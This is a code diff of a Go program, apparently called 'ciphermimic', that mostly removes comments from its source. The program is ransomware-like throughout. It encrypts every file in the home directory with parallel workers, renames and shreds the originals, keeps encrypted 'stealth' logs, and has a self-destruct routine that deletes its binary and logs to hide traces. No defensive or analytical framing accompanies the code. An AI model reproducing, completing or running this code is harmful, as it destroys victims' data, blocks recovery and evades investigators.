@@ -27,7 +27,7 @@ const (
 	keyLength = 32
 )
 
-var loggingEnabled = true // Set to true to enable logging
+var loggingEnabled = true
 
 func main() {
 	password := "super_secret_key"
@@ -43,7 +43,6 @@ func main() {
 		key = deriveKey(password, salt)
 	}
 
-	// Get machine-specific identifier
 	machineID := getMachineID()
 
 	finalKey := deriveKey(string(key), []byte(machineID))
@@ -55,9 +54,9 @@ func main() {
 	}
 
 	if len(os.Args) > 1 && os.Args[1] == "decrypt" {
-		decryptDirectory(homeDir, finalKey) // Call decryption
+		decryptDirectory(homeDir, finalKey)
 	} else {
-		encryptDirectory(homeDir, finalKey) // Default: encrypt
+		encryptDirectory(homeDir, finalKey)
 	}
 
 	zeroMemory(key)
@@ -66,17 +65,14 @@ func main() {
 	fmt.Printf("Process completed in %s\n", time.Since(start))
 }
 
-// Derive a strong key using Argon2
 func deriveKey(password string, salt []byte) []byte {
 	return argon2.Key([]byte(password), salt, 1, 64*1024, 4, keyLength)
 }
 
-// Fetch key from AWS KMS
 func fetchKeyFromKMS(alias string) []byte {
 	sess := session.Must(session.NewSession())
 	kmsSvc := kms.New(sess)
 
-	// Get the KMS key by alias
 	result, err := kmsSvc.GenerateDataKey(&kms.GenerateDataKeyInput{
 		KeyId:   &alias,
 		KeySpec: aws.String("AES_256"),
@@ -86,11 +82,9 @@ func fetchKeyFromKMS(alias string) []byte {
 		selfDestruct()
 	}
 
-	// Return the plaintext key
 	return result.Plaintext
 }
 
-// Generate random salt
 func generateSalt() []byte {
 	salt := make([]byte, saltSize)
 	if _, err := io.ReadFull(rand.Reader, salt); err != nil {
@@ -100,7 +94,6 @@ func generateSalt() []byte {
 	return salt
 }
 
-// Securely zero out key from memory after use
 func zeroMemory(data []byte) {
 	for i := range data {
 		data[i] = 0
@@ -109,22 +102,21 @@ func zeroMemory(data []byte) {
 
 // Get machine-specific identifier (CPU serial or BIOS UUID)
 func getMachineID() string {
-	// This is a simplified version. In real-world use, you'd get hardware identifiers like CPU serial, BIOS UUID, etc.
+	// This is a simplified version. In use, you'd get hardware identifiers like CPU serial, BIOS UUID, etc.
 	return "unique-machine-id"
 }
 
 // Encrypt entire directory by walking through it
 func encryptDirectory(directory string, key []byte) {
 	var wg sync.WaitGroup
-	numWorkers := runtime.NumCPU() // Optimal concurrency level
-	fileChan := make(chan string, numWorkers) // Buffered channel to avoid blocking
+	numWorkers := runtime.NumCPU()
+	fileChan := make(chan string, numWorkers)
 
 	for i := 0; i < numWorkers; i++ {
 		wg.Add(1)
 		go workerEncrypt(fileChan, key, &wg)
 	}
 
-	// Walk directory and send files to workers
 	err := filepath.Walk(directory, func(path string, info os.FileInfo, err error) error {
 		if err != nil || info.IsDir() {
 			return nil
@@ -139,11 +131,10 @@ func encryptDirectory(directory string, key []byte) {
 	wg.Wait()
 }
 
-// Decrypt entire directory by walking through it
 func decryptDirectory(directory string, key []byte) {
 	var wg sync.WaitGroup
-	numWorkers := runtime.NumCPU() // Optimal concurrency level
-	fileChan := make(chan string, numWorkers) // Buffered channel to avoid blocking
+	numWorkers := runtime.NumCPU()
+	fileChan := make(chan string, numWorkers)
 
 	for i := 0; i < numWorkers; i++ {
 		wg.Add(1)
@@ -155,7 +146,6 @@ func decryptDirectory(directory string, key []byte) {
 		if err != nil || info.IsDir() {
 			return nil
 		}
-		// Only process files with ".enc" extension (encrypted files)
 		if filepath.Ext(path) == ".enc" {
 			fileChan <- path
 		}
@@ -168,8 +158,6 @@ func decryptDirectory(directory string, key []byte) {
 	wg.Wait()
 }
 
-
-// Worker function for file encryption
 func workerEncrypt(fileChan chan string, key []byte, wg *sync.WaitGroup) {
 	defer wg.Done()
 	for file := range fileChan {
@@ -177,7 +165,6 @@ func workerEncrypt(fileChan chan string, key []byte, wg *sync.WaitGroup) {
 	}
 }
 
-// Worker function for file decryption
 func workerDecrypt(fileChan chan string, key []byte, wg *sync.WaitGroup) {
 	defer wg.Done()
 	for file := range fileChan {
@@ -185,7 +172,6 @@ func workerDecrypt(fileChan chan string, key []byte, wg *sync.WaitGroup) {
 	}
 }
 
-// Encrypt file and apply HMAC for integrity
 func encryptFile(filePath string, key []byte) {
 	data, err := os.ReadFile(filePath)
 	if err != nil {
@@ -218,14 +204,12 @@ func encryptFile(filePath string, key []byte) {
 	h.Write(encryptedData)
 	hmacValue := h.Sum(nil)
 
-	// Write encrypted data + HMAC
 	err = os.WriteFile(filePath+".enc", append(encryptedData, hmacValue...), 0666)
 	if err != nil {
 		logStealth("Error writing encrypted file:", err)
 		return
 	}
 
-	// Obfuscate and shred the original file
 	secureObfuscateFileName(filePath)
 	shredFile(filePath)
 }
@@ -293,11 +277,9 @@ func shredFile(filePath string) {
 		file.Write(randomData)
 	}
 
-	// Remove file after overwriting
 	os.Remove(filePath)
 }
 
-// Encrypted logging (optional)
 func logStealth(msg string, err error) {
 	if !loggingEnabled {
 		return
@@ -307,7 +289,6 @@ func logStealth(msg string, err error) {
 	appendToLogFile(encryptedLog)
 }
 
-// Encrypt log data for stealthy logging
 func encryptLog(logData string) string {
 	key := []byte("log-encryption-key") // Replace with secure log encryption key
 	block, _ := aes.NewCipher(key)
@@ -317,7 +298,6 @@ func encryptLog(logData string) string {
 	return string(gcm.Seal(nonce, nonce, []byte(logData), nil))
 }
 
-// Append encrypted log data to log file
 func appendToLogFile(data string) {
 	file, err := os.OpenFile("ciphermimic.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
@@ -327,7 +307,6 @@ func appendToLogFile(data string) {
 	file.WriteString(data + "\n")
 }
 
-// Enhanced self-destruct mechanism to delete binary and logs
 func selfDestruct() {
 	fmt.Println("Unauthorized access detected. Self-destruct initiated.")
 	// Delete binary
